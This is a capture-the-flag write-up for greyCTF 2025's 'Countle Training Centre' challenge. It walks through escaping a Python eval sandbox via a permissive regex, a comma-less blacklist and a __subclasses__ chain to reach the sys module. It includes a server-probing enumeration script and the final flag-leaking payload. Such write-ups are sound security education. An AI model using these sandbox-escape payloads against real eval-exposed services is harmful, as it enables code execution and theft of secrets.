# greyCTF 2025: Countle Training Centre
### Writeup by hannnper

This challenge had a number game running on their server and the description:
> The Countle World Championships is coming! Time to step up your game and start training! It's just a measly 1,000,000 puzzles a day, anyone can do it.

But wait... even if you write a solver script the server-side delay of 0.1 seconds means it'll take longer than 24 hours to reach this! 

Once you've entered challenge mode the server sends you a target and some numbers and allowed mathematical operations, and asks you to input an expression that evaluates to the target number. The thing is, the regex check only checks that at least one match exists in your input before sending it to be evaluated:
```python
if (not match(r"[0-9+\-*/()]+", expr)):
    return (print(format("~RThat is not a valid expression. Read 'Help' for more info.~E")))
elif (len(expr) > 160):
    return (print(format("~RWhat are you doing with so many characters? Read 'Help' for more info.~E")))
for b in BLACKLIST + [str(t)]:
    if b in expr:
        return (print(format("~RBlacklisted word is not allowed: "+b+"~E")))
if (not checkAnswer(expr, t)):
    print(format(" ~Rtsk tsk tsk...\n Your answer is wrong!\n I'm dissapointed...~E"))
    exit(0)
```
(it also doesn't check that you're using the given numbers nor only using the allowed maths operations, so you can cheat at solving them, not that it helps much for getting the flag in this situation though)

There's an eval call within `checkAnswer(expr, target)`:
```python
result = eval(expr, {'FLAG':"no flag for you", "__builtins__": None})
``` 
We can't access the flag directly through this eval in the typical ways as the `FLAG` constant and `__builtins__` are overwritten.

A bunch of strings are blacklisted but the list is missing commas between some of the elements, meaning they wouldn't be properly blocked (I didn't end up using them but was good to note):

```python
BLACKLIST = ['breakpoint', 'builtins' 'cat', 'compile', 'dict', 'eval', 'exec', 'getframe',
             'help', 'import', 'input', 'inspect', 'open', 'os', 'sh', 'signal' 'subprocess', 'system']
```

Playing around with the input a bit led me to find that I could view exceptions that were raised when eval evaluates the expression I gave it. 

Although builtins weren't directly accessible, it is still possible to build a subclass chain to access stuff loaded in python.
And so could see what classes were loaded with input like this:
`(0).__class__.__bases__[0].__subclasses__()[0].a`
which raises an AttributeError exception since `a` is generally not defined.

Enumerating the different subclasses accessible throguh the subclass chain (thanks chatGPT for the quick script):

```python
import pexpect
import time

HOST = "challs.nusgreyhats.org"
PORT = 33401

def probe_subclass(i):
    child = pexpect.spawn(f"nc {HOST} {PORT}", timeout=10)
    child.expect("Menu:")
    child.sendline("S")

    child.expect("Your Answer:")
    payload = f"(1)+().__class__.__bases__[0].__subclasses__()[{i}].a"
    print(f"[INFO] Sending index {i} → {payload}")
    child.sendline(payload)

    try:
        child.expect(["Correct!", "wrong", "Menu:", pexpect.EOF], timeout=3)
        output = child.before.decode(errors="ignore").strip()
        print(f"[{i}] Response:\n{output}\n{'-'*40}")
    except pexpect.exceptions.TIMEOUT:
        print(f"[{i}] Timeout or no useful response\n{'-'*40}")

    child.close()

for i in range(0, 300):
    probe_subclass(i)
    time.sleep(0.2)
```

Results in identifying the class at index 217 as a good candidate for accessing other modules (it's the `warnings.catch_warnings` class for this particular implementation of python).

It was challenging to find the right way to extract this info while both staying under the char limit and regex check. I first tried to format it to get an exception to be raised but couldn't get it to work. Thankfully the server is running a version of python with the walrus operator so it could store a reference to the sys module that can be used to call the `.stdout.write()` method and also access the global constant `FLAG` (not the overwritten local version)!

What ended up working was inputting this as my countle answer:
```python
0+(s:=(().__class__.__bases__[0].__subclasses__()[217].__init__.__globals__['sys'])).stdout.write(s.modules['__main__'].FLAG)
```

Which outputs the flag `grey{4_w0r1D_c1As5_c0Un7L3_p1aY3r_1n_0uR_mId5t}` and then immediately tells us our answer is wrong :P